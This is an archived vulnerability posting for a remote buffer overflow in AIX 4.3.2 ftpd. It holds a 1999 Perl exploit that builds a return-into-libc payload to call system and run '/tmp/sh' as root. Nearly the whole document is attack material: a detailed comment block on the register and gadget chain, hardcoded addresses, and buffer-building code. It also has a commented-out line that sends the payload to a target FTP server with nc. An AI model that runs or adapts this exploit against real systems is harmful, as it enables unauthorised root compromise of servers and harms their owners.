source: https://www.securityfocus.com/bid/679/info

A remote buffer overflow vulnerability in AIX's ftpd allows remote users to obtain root access.

#!/usr/bin/perl
# *** Synnergy Networks

# * Description:
#
# Remote bufferoverflow exploit for ftpd from AIX 4.3.2 running on an
# RS6000. (power)
# This is an return into libc exploit specificly crafted for
# one box and it is very unlikely to work on another box

# * Author:
#
# dvorak (dvorak@synnergy.net)
# Synnergy Networks (c) 1999,  http://www.synnergy.net

# * Greets:
#
# Synnergy Networks, Hit2000 crew, Emphyrio, shevek

# * Comments:
#
# A full working exploit will be released later on.
# The addresses point to positions in the program or libraries,
# only the relevant instructions are shown also note that b r0
# is in fact something like mfsbr r0, bsbr or what that is in
# RS6000 assembly.
#
# The final call is to system which needs the following arguments:
# r3 = address of command to execute
# r2 = TOC (what is TOC anyway), I don't know if it does matter but
#      we set it anyway (we can so why not do it)
# r1 = SP but this is ok already,
# the rest is free so it seems.
#
# Our route:
# 0x10010150: sets r2 to a place in the buffer and jumps to 0x10015228
# 0x10015228: loads r12 with a value from our buffera
#             loads r0 with the next address to jump to (0x1001038c)
#             and sets r2 to another place in our buffer
# 0x1001038c: sets r3 to a place in the buffer (finally!)
#             sets r0 to next address to jump to (0xd00406d4, system(...))
#
# The flow with registers is thus:
# r2 = 0x14(r1)
# r12 = 0x110(r2)
# r0 = 0x0(r12)
# r2 = 0x4(r12)
# r3 = 0x40(r1)
# r12 = 0x3c(r2)
# 0x14(r1) = r12 this is  the plave where TOC is stored but it doesn't seem
#            to matter
# r0 = 0x0(12)
# r2 = 0x04(r12)
# and of we go...
#
# We set:
# $buf =  the buffer on the stack $buf[0] is the first byte in the buffer
# but we will count offsets from 4 (the first 4 bytes is just "CEL " is
# doesn't matter, only the space does (it makes sure the rest of the buffer)
# stays the way it is and isn't converted into lower case
#
# Offsets:
# 0x000: 0x1001038c
# 0x004: buf[0]
# 0x008: this is the place where the address of the systemcall is taken from
#        0xd00406d4 in our case# 0x00c: thi is the address where r2 is
loaded
#        from just before the call to
#        system(..) we set it to the TOC in our program we don't know if it
#        matters and if the TOC is constant between hosts
# 0x03c: buf[08]
# 0x110: buf[0]
# 0x204: return address (0x10010150)
# 0x210: buf[0]
# 0x23c: buf[0x240]
# 0x240: "/tmp/sh" or whatever command you want to execute
# r1 points to buf[0x1fc]
#
# I assume the positions in the libraries/program are fixed and that TOC
# either doesn't matter or is fixed to please enlighten me on these topics.
#
# 0x10010150:
#     l   r2, 0x14(r1)
#     b   0x10015228
# 0x10015228:
#     l   r12, 0x110(r2)
#     st  r12, 0x14(r1)
#     l   r0, 0x0(r12)
#     l   r2, 0x4(r12)
#     b   r0
# 0x1001038c:
#     l   r3, 0x40(r1)
#     b   0x100136f8
# 0x100136f8:
#     l   r12, 0x3c(r2)
#     st  r12, 0x14(r1)
#     l   r0,  0x0(r12)
#     l   r2,  0x04(r12)

# *** Synnergy Networks

$bufstart = 0x2ff22724;         # this is our first guess
$nop = "\xde\xad\xca\xfe";
$buf = "CEL ";
$buf .= "\x10\x01\x03\x8c";     # 0 address of second piece of
                                # 'borrowed' code
$buf .= pack ("N", $bufstart);  # 4
$buf .= "\xd0\x04\x06\xd4";     # 8 system call..
$buf .= "\xf0\x14\x63\x5c";     # c TOC
$offset = 0x10;
while ($offset < 0x3c) {
    $offset += 4;
    $buf .= $nop;
}
$buf .= pack ("N", $bufstart + 0x008);
$offset += 4;
while ($offset < 0x110) {
    $offset += 4;
    $buf .= $nop;
}
$buf .= pack ("N", $bufstart);
$offset += 4;
while ($offset < 0x204) {
    $offset += 4;
    $buf .= $nop;
}
$buf .= "\x10\x01\x01\x50";
$offset += 4;
while ($offset < 0x210) {
    $offset += 4;
    $buf .= $nop;
}
$buf .= pack ("N", $bufstart);
$offset += 4;
while ($offset < 0x23c) {
    $offset += 4;
    $buf .= $nop;
}
$buf .= pack ("N", $bufstart + 0x240);
$offset += 4;
while ($offset < 0x240) {
    $offset += 4;
    $buf .= $nop;
}
# this is the command that will be run through system
$buf .= "/tmp/sh";
$buf .= "\n";

# offcourse you should change this .
# open F, "| nc -v -v -n 192.168.2.12 21";
open F, "| od -tx1";
printf F $buf;
close F;

# EOF